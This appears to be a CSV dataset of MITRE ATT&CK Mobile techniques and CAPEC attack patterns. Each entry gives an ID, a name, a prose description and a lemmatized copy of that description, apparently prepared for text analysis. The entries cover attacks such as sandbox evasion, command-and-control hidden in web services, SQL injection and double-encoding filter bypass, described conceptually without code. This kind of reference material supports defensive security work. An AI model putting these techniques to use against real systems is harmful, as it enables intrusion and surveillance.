T1421,System Network Connections Discovery,"Adversaries may attempt to get a listing of network connections to or from the compromised device they are currently accessing or from remote systems by querying for information over the network. This is typically accomplished by utilizing device APIs to collect information about nearby networks, such as Wi-Fi, Bluetooth, and cellular tower connections. On Android, this can be done by querying the respective APIs: WifiInfo for information about the current Wi-Fi connection, as well as nearby Wi-Fi networks. Querying the WiFiInfo API requires the application to hold the ACCESS_FINE_LOCATION permission. BluetoothAdapter for information about Bluetooth devices, which also requires the application to hold several permissions granted by the user at runtime. For Android versions prior to Q, applications can use the TelephonyManager.getNeighboringCellInfo() method. For Q and later, applications can use the TelephonyManager.getAllCellInfo() method. Both methods require the application hold the ACCESS_FINE_LOCATION permission.",adversary attempt listing network connection compromised device currently access remote system query information network typically accomplish utilize device api collect information nearby network wi fi bluetooth cellular tower connection android query respective api wifiinfo information current wi fi connection nearby wi fi network query wifiinfo api require application hold permission bluetoothadapter information bluetooth device require application hold permission grant user runtime android version prior q application use method q later application use method method require application hold permission
T1512,Video Capture,"An adversary can leverage a device’s cameras to gather information by capturing video recordings. Images may also be captured, potentially in specified intervals, in lieu of video files. Malware or scripts may interact with the device cameras through an available API provided by the operating system. Video or image files may be written to disk and exfiltrated later. This technique differs from Screen Capture due to use of the device’s cameras for video recording rather than capturing the victim’s screen. In Android, an application must hold the android.permission.CAMERA permission to access the cameras. In iOS, applications must include the NSCameraUsageDescription key in the Info.plist file. In both cases, the user must grant permission to the requesting application to use the camera. If the device has been rooted or jailbroken, an adversary may be able to access the camera without knowledge of the user.",adversary leverage device camera gather information capture video recording image capture potentially specify interval lieu video file malware script interact device camera available api provide operate system video image file write disk exfiltrate later technique differ screen capture use device camera video recording capture victim screen android application hold camera permission access camera ios application include nscamerausagedescription key file case user grant permission request application use camera device root jailbroken adversary able access camera knowledge user
T1633,Virtualization/Sandbox Evasion,"Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors after checking for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware’s behavior to disengage from the victim or conceal the core functions of the payload. They may also search for VME artifacts before dropping further payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors. Adversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment.",adversary employ mean detect avoid virtualization analysis environment include change behavior check presence artifact indicative virtual machine environment vme sandbox adversary detect vme alter malware behavior disengage victim conceal core function payload search vme artifact drop payload adversary use information learn virtualization sandbox evasion automate discovery shape follow behavior adversary use method accomplish virtualization sandbox evasion check system artifact associate analysis virtualization adversary check legitimate user activity help determine analysis environment
T1633.001,Virtualization/Sandbox Evasion: System Checks,"Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behavior after checking for the presence of artifacts indicative of a virtual environment or sandbox. If the adversary detects a virtual environment, they may alter their malware’s behavior to disengage from the victim or conceal the core functions of the implant. They may also search for virtualization artifacts before dropping secondary or additional payloads. Checks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. Hardware checks, such as the presence of motion sensors, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.",adversary employ system check detect avoid virtualization analysis environment include change behavior check presence artifact indicative virtual environment sandbox adversary detect virtual environment alter malware behavior disengage victim conceal core function implant search virtualization artifact drop secondary additional payload check include generic system property host domain sample network traffic adversary check network adapter address cpu core count available memory drive size hardware check presence motion sensor gather evidence indicative virtual environment adversary query specific reading device
T1481,Web Service,"Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites and social media, acting as a mechanism for C2, may give a significant amount of cover. This is due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection. Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis, or enable operational resiliency (since this infrastructure may be dynamically changed).",adversary use exist legitimate external web service means relay datum compromised system popular website social medium act mechanism significant cover likelihood host network communicate prior compromise common service offer google twitter make easy adversary hide expect noise web service provider commonly use ssl tls encryption give adversary add level protection use web service protect end infrastructure discovery malware binary analysis enable operational resiliency infrastructure dynamically change
T1481.001,Web Service: Dead Drop Resolver,"Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers. Popular websites and social media, acting as a mechanism for C2, may give a significant amount of cover. This is due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection. Use of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis, or enable operational resiliency (since this infrastructure may be dynamically changed).",adversary use exist legitimate external web service host information point additional command control infrastructure adversary post content know dead drop resolver web service embed obfuscate encode domain ip address infect victim reach redirect resolver popular website social medium act mechanism significant cover likelihood host network communicate prior compromise common service offer google twitter make easier adversary hide expected noise web service provider commonly use ssl tls encryption give adversary add level protection use dead drop resolver protect end infrastructure discovery malware binary analysis enable operational resiliency infrastructure dynamically change
T1481.002,Web Service: Bidirectional Communication,"Adversaries may use an existing, legitimate external Web service channel as a means for sending commands to and receiving output from a compromised system. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. Popular websites and social media, acting as a mechanism for C2, may give a significant amount of cover. This is due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.",adversary use exist legitimate external web service channel means send command receive output compromised system compromised system leverage popular website social medium host command control instruction infected system send output command web service channel return traffic occur variety way depend web service utilize example return traffic form compromised system post comment forum issue pull request development project update document host web service send tweet popular website social medium act mechanism significant cover likelihood host network communicate prior compromise common service offer google twitter make easy adversary hide expected noise web service provider commonly use ssl tls encryption give adversary add level protection
T1481.003,Web Service: One-Way Communication,"Adversaries may use an existing, legitimate external Web service channel as a means for sending commands to a compromised system without receiving return output. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response. Popular websites and social media, acting as a mechanism for C2, may give a significant amount of cover. This is due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.",adversary use exist legitimate external web service channel means send command compromised system receive return output compromised system leverage popular website social medium host command control instruction infected system opt send output command different channel include distinct web service alternatively compromised system return output case adversary want send instruction system want response popular website social medium act mechanism significant cover likelihood host network communicate prior compromise common service offer google twitter make easy adversary hide expected noise web service provider commonly use ssl tls encryption give adversary add level protection
CAPEC-1,Accessing Functionality Not Properly Constrained by ACLs,"In applications, particularly web applications, access to functionality is mitigated by an authorization framework. This framework maps Access Control Lists (ACLs) to elements of the application's functionality; particularly URL's for web apps. In the case that the administrator failed to specify an ACL for a particular element, an attacker may be able to access it with impunity. An attacker with the ability to access functionality not properly constrained by ACLs can obtain sensitive information and possibly compromise the entire application. Such an attacker can access resources that must be available only to users at a higher privilege level, can access management sections of the application, or can run queries for data that they otherwise not supposed to.",application particularly web application access functionality mitigate authorization framework framework map access control lists acls element application functionality particularly url web app case administrator fail specify acl particular element attacker able access impunity attacker ability access functionality properly constrain acl obtain sensitive information possibly compromise entire application attacker access resource available user high privilege level access management section application run query datum suppose
CAPEC-10,Buffer Overflow via Environment Variables,"This attack pattern involves causing a buffer overflow through manipulation of environment variables. Once the adversary finds that they can modify an environment variable, they may try to overflow associated buffers. This attack leverages implicit trust often placed in environment variables.Although the focus of this attack is putting excessive content into an environment variable that is loaded into a buffer, environment variables can be used to assist a classic buffer overflow attack as well. In the case where the buffer used in a traditional buffer overflow attack is not large enough to store the adversary's shell code, they will store the shell code in an environment variable and attempt to return to its address, rather than back into the data they wrote to the buffer.",attack pattern involve cause buffer overflow manipulation environment variable adversary find modify environment variable try overflow associate buffer attack leverage implicit trust place environment variable focus attack put excessive content environment variable load buffer environment variable assist classic buffer overflow attack case buffer traditional buffer overflow attack large store adversary shell code store shell code environment variable attempt return address datum write buffer
CAPEC-100,Overflow Buffers,"Buffer Overflow attacks target improper or missing bounds checking on buffer operations, typically triggered by input injected by an adversary. As a consequence, an adversary is able to write past the boundaries of allocated buffer regions in memory, causing a program crash or potentially redirection of execution as per the adversaries' choice.",buffer overflow attack target improper missing bound checking buffer operation typically trigger input inject adversary consequence adversary able write past boundary allocate buffer region memory cause program crash potentially redirection execution adversary choice
CAPEC-101,Server Side Include (SSI) Injection,"An attacker can use Server Side Include (SSI) Injection to send code to a web application that then gets executed by the web server. Doing so enables the attacker to achieve similar results to Cross Site Scripting, viz., arbitrary code execution and information disclosure, albeit on a more limited scale, since the SSI directives are nowhere near as powerful as a full-fledged scripting language. Nonetheless, the attacker can conveniently gain access to sensitive files, such as password files, and execute shell commands.",attacker use server include ssi injection send code web application gets execute web server enable attacker achieve similar result cross site scripting viz arbitrary code execution information disclosure albeit limited scale ssi directive near powerful fledge scripting language nonetheless attacker conveniently gain access sensitive file password file execute shell command
CAPEC-102,Session Sidejacking,"Session sidejacking takes advantage of an unencrypted communication channel between a victim and target system. The attacker sniffs traffic on a network looking for session tokens in unencrypted traffic. Once a session token is captured, the attacker performs malicious actions by using the stolen token with the targeted application to impersonate the victim. This attack is a specific method of session hijacking, which is exploiting a valid session token to gain unauthorized access to a target system or information. Other methods to perform a session hijacking are session fixation, cross-site scripting, or compromising a user or server machine and stealing the session token.",session sidejacking take advantage unencrypted communication channel victim target system attacker sniff traffic network look session token unencrypted traffic session token capture attacker perform malicious action steal token target application impersonate victim attack specific method session hijacking exploit valid session token gain unauthorized access target system information method perform session hijacking session fixation cross site scripting compromise user server machine steal session token
CAPEC-103,Clickjacking,"An adversary tricks a victim into unknowingly initiating some action in one system while interacting with the UI from a seemingly completely different, usually an adversary controlled or intended, system.While being logged in to some target system, the victim visits the adversary's malicious site which displays a UI that the victim wishes to interact with. In reality, the clickjacked page has a transparent layer above the visible UI with action controls that the adversary wishes the victim to execute. The victim clicks on buttons or other UI elements they see on the page which actually triggers the action controls in the transparent overlaying layer. Depending on what that action control is, the adversary may have just tricked the victim into executing some potentially privileged (and most certainly undesired) functionality in the target system to which the victim is authenticated. The basic problem here is that there is a dichotomy between what the victim thinks they are clicking on versus what they are actually clicking on.",adversary trick victim unknowingly initiate action system interact ui seemingly completely different usually adversary control intend system log target system victim visit adversary malicious site display ui victim wish interact reality clickjacke page transparent layer visible ui action control adversary wish victim execute victim click button ui element page actually trigger action control transparent overlay layer depend action control adversary trick victim execute potentially privileged certainly undesired functionality target system victim authenticate basic problem dichotomy victim think click versus actually click
CAPEC-104,Cross Zone Scripting,"An attacker is able to cause a victim to load content into their web-browser that bypasses security zone controls and gain access to increased privileges to execute scripting code or other web objects such as unsigned ActiveX controls or applets. This is a privilege elevation attack targeted at zone-based web-browser security.In a zone-based model, pages belong to one of a set of zones corresponding to the level of privilege assigned to that page. Pages in an untrusted zone would have a lesser level of access to the system and/or be restricted in the types of executable content it was allowed to invoke. In a cross-zone scripting attack, a page that should be assigned to a less privileged zone is granted the privileges of a more trusted zone. This can be accomplished by exploiting bugs in the browser, exploiting incorrect configuration in the zone controls, through a cross-site scripting attack that causes the attackers' content to be treated as coming from a more trusted page, or by leveraging some piece of system functionality that is accessible from both the trusted and less trusted zone. This attack differs from ""Restful Privilege Escalation"" in that the latter correlates to the inadequate securing of RESTful access methods (such as HTTP DELETE) on the server, while cross-zone scripting attacks the concept of security zones as implemented by a browser.",attacker able cause victim load content web browser bypass security zone control gain access increase privilege execute scripting code web object unsigned activex control applet privilege elevation attack target zone base web browser security zone base model page belong set zone correspond level privilege assign page page untrusted zone less level access system restrict type executable content allow invoke cross zone scripting attack page assign privileged zone grant privilege trusted zone accomplish exploit bug browser exploit incorrect configuration zone control cross site scripting attack cause attacker content treat come trusted page leverage piece system functionality accessible trusted trusted zone attack differ restful privilege escalation correlate inadequate securing restful access method http delete server cross zone scripting attack concept security zone implement browser
CAPEC-105,HTTP Request Splitting,"An adversary abuses the flexibility and discrepancies in the parsing and interpretation of HTTP Request messages by different intermediary HTTP agents (e.g., load balancer, reverse proxy, web caching proxies, application firewalls, etc.) to split a single HTTP request into multiple unauthorized and malicious HTTP requests to a back-end HTTP agent (e.g., web server).See CanPrecede relationships for possible consequences.This entails the adversary injecting malicious user input into various standard and/or user defined HTTP headers within a HTTP Request through user input of Carriage Return (CR), Line Feed (LF), Horizontal Tab (HT), Space (SP) characters as well as other valid/RFC compliant special characters and unique character encoding. This malicious user input allows for web script to be injected in HTTP headers as well as into browser cookies or Ajax web/browser object parameters like XMLHttpRequest during implementation of asynchronous requests.This attack is usually the result of the usage of outdated or incompatible HTTP protocol versions as well as lack of syntax checking and filtering of user input in the HTTP agents receiving HTTP messages in the path.This differs from CAPEC-34 HTTP Response Splitting, which is usually an attempt to compromise a client agent (e.g., web browser) by sending malicious content in HTTP responses from back-end HTTP infrastructure. HTTP Request Splitting is an attempt to compromise aback-end HTTP agentvia HTTP Request messages.HTTP Smuggling (CAPEC-33 and CAPEC-273) is different from HTTP Splitting due to the fact it relies upon discrepancies in the interpretation of various HTTP Headers and message sizes and not solely user input of special characters and character encoding. HTTP Smuggling was established to circumvent mitigations against HTTP Request Splitting techniques.",adversary abuse flexibility discrepancy parsing interpretation http request message different intermediary http agent load balancer reverse proxy web caching proxy application firewall etc split single http request multiple unauthorized malicious http request end http agent web canprecede relationship possible consequence entail adversary inject malicious user input standard user define http header http request user input carriage return cr line feed lf horizontal tab ht space sp character valid rfc compliant special character unique character encoding malicious user input allow web script inject http header browser cookie ajax web browser object parameter like xmlhttprequest implementation asynchronous request attack usually result usage outdated incompatible http protocol version lack syntax checking filtering user input http agent receive http message path differ http response splitting usually attempt compromise client agent web browser send malicious content http response end http infrastructure http request splitting attempt compromise aback end http agentvia http request message http smuggling different http splitting fact rely discrepancy interpretation http header message size solely user input special character character encoding http smuggling establish circumvent mitigation http request splitting technique
CAPEC-107,Cross Site Tracing,"Cross Site Tracing (XST) enables an adversary to steal the victim's session cookie and possibly other authentication credentials transmitted in the header of the HTTP request when the victim's browser communicates to a destination system's web server.The adversary uses an XSS attack to have victim's browser sent an HTTP TRACE request to a destination web server, which will proceed to return a response to the victim's web browser that contains the original HTTP request in its body. Since the HTTP header of the original HTTP TRACE request had the victim's session cookie in it, that session cookie can now be picked off the HTTP TRACE response and sent to the adversary's malicious site. XST becomes relevant when direct access to the session cookie via the ""document.cookie"" object is disabled with the use of httpOnly attribute which ensures that the cookie can be transmitted in HTTP requests but cannot be accessed in other ways. Using SSL does not protect against XST. If the system with which the victim is interacting is susceptible to XSS, an adversary can exploit that weakness directly to get their malicious script to issue an HTTP TRACE request to the destination system's web server.",cross site tracing xst enable adversary steal victim session cookie possibly authentication credential transmit header http request victim browser communicate destination system web server adversary use xss attack victim browser send http trace request destination web server proceed return response victim web browser contain original http request body http header original http trace request victim session cookie session cookie pick http trace response send adversary malicious site xst relevant direct access session cookie object disable use httponly attribute ensure cookie transmit http request access way ssl protect xst system victim interact susceptible xss adversary exploit weakness directly malicious script issue http trace request destination system web server
CAPEC-108,Command Line Execution through SQL Injection,"An attacker uses standard SQL injection methods to inject data into the command line for execution. This could be done directly through misuse of directives such as MSSQL_xp_cmdshell or indirectly through injection of data into the database that would be interpreted as shell commands. Sometime later, an unscrupulous backend application (or could be part of the functionality of the same application) fetches the injected data stored in the database and uses this data as command line arguments without performing proper validation. The malicious data escapes that data plane by spawning new commands to be executed on the host.",attacker use standard sql injection method inject datum command line execution directly misuse directive indirectly injection datum database interpret shell command later unscrupulous backend application functionality application fetch inject datum store database use datum command line argument perform proper validation malicious data escape data plane spawn new command execute host
CAPEC-109,Object Relational Mapping Injection,"An attacker leverages a weakness present in the database access layer code generated with an Object Relational Mapping (ORM) tool or a weakness in the way that a developer used a persistence framework to inject their own SQL commands to be executed against the underlying database. The attack here is similar to plain SQL injection, except that the application does not use JDBC to directly talk to the database, but instead it uses a data access layer generated by an ORM tool or framework (e.g. Hibernate). While most of the time code generated by an ORM tool contains safe access methods that are immune to SQL injection, sometimes either due to some weakness in the generated code or due to the fact that the developer failed to use the generated access methods properly, SQL injection is still possible.",attacker leverage weakness present database access layer code generate object relational mapping orm tool weakness way developer persistence framework inject sql command execute underlie database attack similar plain sql injection application use jdbc directly talk database instead use datum access layer generate orm tool framework hibernate time code generate orm tool contain safe access method immune sql injection weakness generate code fact developer fail use generate access method properly sql injection possible
CAPEC-11,Cause Web Server Misclassification,"An attack of this type exploits a Web server's decision to take action based on filename or file extension. Because different file types are handled by different server processes, misclassification may force the Web server to take unexpected action, or expected actions in an unexpected sequence. This may cause the server to exhaust resources, supply debug or system data to the attacker, or bind an attacker to a remote process.This type of vulnerability has been found in many widely used servers including IIS, Lotus Domino, and Orion. The attacker's job in this case is straightforward, standard communication protocols and methods are used and are generally appended with malicious information at the tail end of an otherwise legitimate request. The attack payload varies, but it could be special characters like a period or simply appending a tag that has a special meaning for operations on the server side like .jsp for a java application server. The essence of this attack is that the attacker deceives the server into executing functionality based on the name of the request, i.e. login.jsp, not the contents.",attack type exploit web server decision action base filename file extension different file type handle different server process misclassification force web server unexpected action expected action unexpected sequence cause server exhaust resource supply debug system datum attacker bind attacker remote process type vulnerability find widely server include iis lotus domino orion attacker job case straightforward standard communication protocol method generally append malicious information tail end legitimate request attack payload vary special character like period simply append tag special meaning operation server like java application server essence attack attacker deceive server execute functionality base request content
CAPEC-110,SQL Injection through SOAP Parameter Tampering,"An attacker modifies the parameters of the SOAP message that is sent from the service consumer to the service provider to initiate a SQL injection attack. On the service provider side, the SOAP message is parsed and parameters are not properly validated before being used to access a database in a way that does not use parameter binding, thus enabling the attacker to control the structure of the executed SQL query. This pattern describes a SQL injection attack with the delivery mechanism being a SOAP message.",attacker modify parameter soap message send service consumer service provider initiate sql injection attack service provider soap message parse parameter properly validate access database way use parameter binding enable attacker control structure execute sql query pattern describe sql injection attack delivery mechanism soap message
CAPEC-111,JSON Hijacking (aka JavaScript Hijacking),"An attacker targets a system that uses JavaScript Object Notation (JSON) as a transport mechanism between the client and the server (common in Web 2.0 systems using AJAX) to steal possibly confidential information transmitted from the server back to the client inside the JSON object by taking advantage of the loophole in the browser's Same Origin Policy that does not prohibit JavaScript from one website to be included and executed in the context of another website.An attacker gets the victim to visit their malicious page that contains a script tag whose source points to the vulnerable system with a URL that requests a response from the server containing a JSON object with possibly confidential information. The malicious page also contains malicious code to capture the JSON object returned by the server before any other processing on it can take place, typically by overriding the JavaScript function used to create new objects. This hook allows the malicious code to get access to the creation of each object and transmit the possibly sensitive contents of the captured JSON object to the attackers' server.There is nothing in the browser's security model to prevent the attackers' malicious JavaScript code (originating from attacker's domain) to set up an environment (as described above) to intercept a JSON object response (coming from the vulnerable target system's domain), read its contents and transmit to the attackers' controlled site. The same origin policy protects the domain object model (DOM), but not the JSON.",attacker target system use javascript object notation json transport mechanism client server common web system ajax steal possibly confidential information transmit server client inside json object take advantage loophole browser origin policy prohibit javascript website include execute context website attacker get victim visit malicious page contain script tag source point vulnerable system url request response server contain json object possibly confidential information malicious page contain malicious code capture json object return server processing place typically override javascript function create new object hook allow malicious code access creation object transmit possibly sensitive content capture json object attacker server browser security model prevent attacker malicious javascript code originate attacker domain set environment describe intercept json object response come vulnerable target system domain read content transmit attacker control site origin policy protect domain object model dom json
CAPEC-112,Brute Force,"In this attack, some asset (information, functionality, identity, etc.) is protected by a finite secret value. The attacker attempts to gain access to this asset by using trial-and-error to exhaustively explore all the possible secret values in the hope of finding the secret (or a value that is functionally equivalent) that will unlock the asset.Examples of secrets can include, but are not limited to, passwords, encryption keys, database lookup keys, and initial values to one-way functions. The key factor in this attack is the attackers' ability to explore the possible secret space rapidly. This, in turn, is a function of the size of the secret space and the computational power the attacker is able to bring to bear on the problem. If the attacker has modest resources and the secret space is large, the challenge facing the attacker is intractable. Assuming a finite secret space, a brute force attack will eventually succeed. The defender must rely on making sure that the time and resources necessary to do so will exceed the value of the information.",attack asset information functionality identity etc protect finite secret value attacker attempt gain access asset trial error exhaustively explore possible secret value hope find secret value functionally equivalent unlock asset example secret include limit password encryption key database lookup key initial value way function key factor attack attacker ability explore possible secret space rapidly turn function size secret space computational power attacker able bring bear problem attacker modest resource secret space large challenge face attacker intractable assume finite secret space brute force attack eventually succeed defender rely make sure time resource necessary exceed value information
CAPEC-113,Interface Manipulation,"An adversary manipulates the use or processing of an interface (e.g. Application Programming Interface (API) or System-on-Chip (SoC)) resulting in an adverse impact upon the security of the system implementing the interface. This can allow the adversary to bypass access control and/or execute functionality not intended by the interface implementation, possibly compromising the system which integrates the interface. Interface manipulation can take on a number of forms including forcing the unexpected use of an interface or the use of an interface in an unintended way.",adversary manipulate use processing interface application programming interface api system chip soc result adverse impact security system implement interface allow adversary bypass access control execute functionality intend interface implementation possibly compromise system integrate interface interface manipulation number form include force unexpected use interface use interface unintended way
CAPEC-114,Authentication Abuse,"An attacker obtains unauthorized access to an application, service or device either through knowledge of the inherent weaknesses of an authentication mechanism, or by exploiting a flaw in the authentication scheme's implementation. In such an attack an authentication mechanism is functioning but a carefully controlled sequence of events causes the mechanism to grant access to the attacker.This attack may exploit assumptions made by the target's authentication procedures, such as assumptions regarding trust relationships or assumptions regarding the generation of secret values. This attack differs from Authentication Bypass attacks in that Authentication Abuse allows the attacker to be certified as a valid user through illegitimate means, while Authentication Bypass allows the user to access protected material without ever being certified as an authenticated user. This attack does not rely on prior sessions established by successfully authenticating users, as relied upon for the ""Exploitation of Session Variables, Resource IDs and other Trusted Credentials"" attack patterns.",attacker obtain unauthorized access application service device knowledge inherent weakness authentication mechanism exploit flaw authentication scheme implementation attack authentication mechanism function carefully control sequence event cause mechanism grant access attacker attack exploit assumption target authentication procedure assumption trust relationship assumption generation secret value attack differ authentication bypass attack authentication abuse allow attacker certify valid user illegitimate mean authentication bypass allow user access protect material certify authenticate user attack rely prior session establish successfully authenticate user rely exploitation session variable resource id trusted credential attack pattern
CAPEC-115,Authentication Bypass,"An attacker gains access to application, service, or device with the privileges of an authorized or privileged user by evading or circumventing an authentication mechanism. The attacker is therefore able to access protected data without authentication ever having taken place.This refers to an attacker gaining access equivalent to an authenticated user without ever going through an authentication procedure. This is usually the result of the attacker using an unexpected access procedure that does not go through the proper checkpoints where authentication should occur. For example, a web site might assume that all users will click through a given link in order to get to secure material and simply authenticate everyone that clicks the link. However, an attacker might be able to reach secured web content by explicitly entering the path to the content rather than clicking through the authentication link, thereby avoiding the check entirely. This attack pattern differs from other authentication attacks in that attacks of this pattern avoid authentication entirely, rather than faking authentication by exploiting flaws or by stealing credentials from legitimate users.",attacker gain access application service device privilege authorized privileged user evade circumvent authentication mechanism attacker able access protect datum authentication having take place refer attacker gain access equivalent authenticate user go authentication procedure usually result attacker unexpected access procedure proper checkpoint authentication occur example web site assume user click give link order secure material simply authenticate click link attacker able reach secure web content explicitly enter path content click authentication link avoid check entirely attack pattern differ authentication attack attack pattern avoid authentication entirely fake authentication exploit flaw steal credential legitimate user
CAPEC-116,Excavation,"An adversary actively probes the target in a manner that is designed to solicit information that could be leveraged for malicious purposes.This is achieved by exploring the target via ordinary interactions for the purpose of gathering intelligence about the target, or by sending data that is syntactically invalid or non-standard in an attempt to produce a response that contains the desired data. As a result of these interactions, the adversary is able to obtain information from the target that aids the attacker in making inferences about its security, configuration, or potential vulnerabilities. Examplar exchanges with the target may trigger unhandled exceptions or verbose error messages that reveal information like stack traces, configuration information, path information, or database design. This type of attack also includes the manipulation of query strings in a URI to produce invalid SQL queries, or by trying alternative path values in the hope that the server will return useful information.",adversary actively probe target manner design solicit information leverage malicious purpose achieve explore target ordinary interaction purpose gather intelligence target send datum syntactically invalid non standard attempt produce response contain desire datum result interaction adversary able obtain information target aid attacker make inference security configuration potential vulnerability examplar exchange target trigger unhandled exception verbose error message reveal information like stack trace configuration information path information database design type attack include manipulation query string uri produce invalid sql query try alternative path value hope server return useful information
CAPEC-117,Interception,"An adversary monitors data streams to or from the target for information gathering purposes. This attack may be undertaken to solely gather sensitive information or to support a further attack against the target. This attack pattern can involve sniffing network traffic as well as other types of data streams (e.g. radio). The adversary can attempt to initiate the establishment of a data stream or passively observe the communications as they unfold. In all variants of this attack, the adversary is not the intended recipient of the data stream. In contrast to other means of gathering information (e.g., targeting data leaks), the adversary must actively position themself so as to observe explicit data channels (e.g. network traffic) and read the content. However, this attack differs from a Adversary-In-the-Middle (CAPEC-94) attack, as the adversary does not alter the content of the communications nor forward data to the intended recipient.",adversary monitor data stream target information gathering purpose attack undertake solely gather sensitive information support attack target attack pattern involve sniff network traffic type data stream radio adversary attempt initiate establishment data stream passively observe communication unfold variant attack adversary intend recipient data stream contrast mean gather information target datum leak adversary actively position themself observe explicit datum channel network traffic read content attack differ adversary middle attack adversary alter content communication forward datum intended recipient
CAPEC-12,Choosing Message Identifier,"This pattern of attack is defined by the selection of messages distributed via multicast or public information channels that are intended for another client by determining the parameter value assigned to that client. This attack allows the adversary to gain access to potentially privileged information, and to possibly perpetrate other attacks through the distribution means by impersonation. If the channel/message being manipulated is an input rather than output mechanism for the system, (such as a command bus), this style of attack could be used to change the adversary's identifier to more a privileged one.",pattern attack define selection message distribute multicast public information channel intend client determine parameter value assign client attack allow adversary gain access potentially privileged information possibly perpetrate attack distribution mean impersonation channel message manipulate input output mechanism system command bus style attack change adversary identifier privileged
CAPEC-120,Double Encoding,"The adversary utilizes a repeating of the encoding process for a set of characters (that is, character encoding a character encoding of a character) to obfuscate the payload of a particular request. This may allow the adversary to bypass filters that attempt to detect illegal characters or strings, such as those that might be used in traversal or injection attacks. Filters may be able to catch illegal encoded strings, but may not catch doubly encoded strings. For example, a dot (.), often used in path traversal attacks and therefore often blocked by filters, could be URL encoded as %2E. However, many filters recognize this encoding and would still block the request. In a double encoding, the % in the above URL encoding would be encoded again as %25, resulting in %252E which some filters might not catch, but which could still be interpreted as a dot (.) by interpreters on the target.",adversary utilize repeating encoding process set character character encoding character encoding character obfuscate payload particular request allow adversary bypass filter attempt detect illegal character string traversal injection attack filter able catch illegal encode string catch doubly encode string example dot path traversal attack block filter url encode filter recognize encoding block request double encoding url encoding encode result filter catch interpret dot interpreter target
CAPEC-121,Exploit Non-Production Interfaces,"An adversary exploits a sample, demonstration, test, or debug interface that is unintentionally enabled on a production system, with the goal of gleaning information or leveraging functionality that would otherwise be unavailable.Non-production interfaces are insecure by default and should not be resident on production systems, since they may reveal sensitive information or functionality that should not be known to end-users. However, such interfaces may be unintentionally left enabled on a production system due to configuration errors, supply chain mismanagement, or other pre-deployment activities.Ultimately, failure to properly disable non-production interfaces, in a production environment, may expose a great deal of diagnostic information or functionality to an adversary, which can be utilized to further refine their attack. Moreover, many non-production interfaces do not have adequate security controls or may not have undergone rigorous testing since they were not intended for use in production environments. As such, they may contain many flaws and vulnerabilities that could allow an adversary to severely disrupt a target.",adversary exploit sample demonstration test debug interface unintentionally enable production system goal glean information leverage functionality unavailable non production interface insecure default resident production system reveal sensitive information functionality know end user interface unintentionally leave enabled production system configuration error supply chain mismanagement pre deployment activity ultimately failure properly disable non production interface production environment expose great deal diagnostic information functionality adversary utilize refine attack non production interface adequate security control undergo rigorous testing intend use production environment contain flaw vulnerability allow adversary severely disrupt target
CAPEC-122,Privilege Abuse,"An adversary is able to exploit features of the target that should be reserved for privileged users or administrators but are exposed to use by lower or non-privileged accounts. Access to sensitive information and functionality must be controlled to ensure that only authorized users are able to access these resources.If access control mechanisms are absent or misconfigured, a user may be able to access resources that are intended only for higher level users. An adversary may be able to exploit this to utilize a less trusted account to gain information and perform activities reserved for more trusted accounts.This attack differs from privilege escalation and other privilege stealing attacks in that the adversary never actually escalates their privileges but instead is able to use a lesser degree of privilege to access resources that should be (but are not) reserved for higher privilege accounts. Likewise, the adversary does not exploit trust or subvert systems - all control functionality is working as configured but the configuration does not adequately protect sensitive resources at an appropriate level.",adversary able exploit feature target reserve privileged user administrator expose use low non privileged account access sensitive information functionality control ensure authorize user able access resource access control mechanism absent misconfigured user able access resource intend high level user adversary able exploit utilize trusted account gain information perform activity reserve trusted account attack differ privilege escalation privilege stealing attack adversary actually escalate privilege instead able use less degree privilege access resource reserve high privilege account likewise adversary exploit trust subvert system control functionality work configure configuration adequately protect sensitive resource appropriate level
CAPEC-123,Buffer Manipulation,"An adversary manipulates an application's interaction with a buffer in an attempt to read or modify data they shouldn't have access to. Buffer attacks are distinguished in that it is the buffer space itself that is the target of the attack rather than any code responsible for interpreting the content of the buffer. In virtually all buffer attacks the content that is placed in the buffer is immaterial. Instead, most buffer attacks involve retrieving or providing more input than can be stored in the allocated buffer, resulting in the reading or overwriting of other unintended program memory.",adversary manipulate application interaction buffer attempt read modify datum access buffer attack distinguish buffer space target attack code responsible interpret content buffer virtually buffer attack content place buffer immaterial instead buffer attack involve retrieve provide input store allocate buffer result reading overwriting unintended program memory
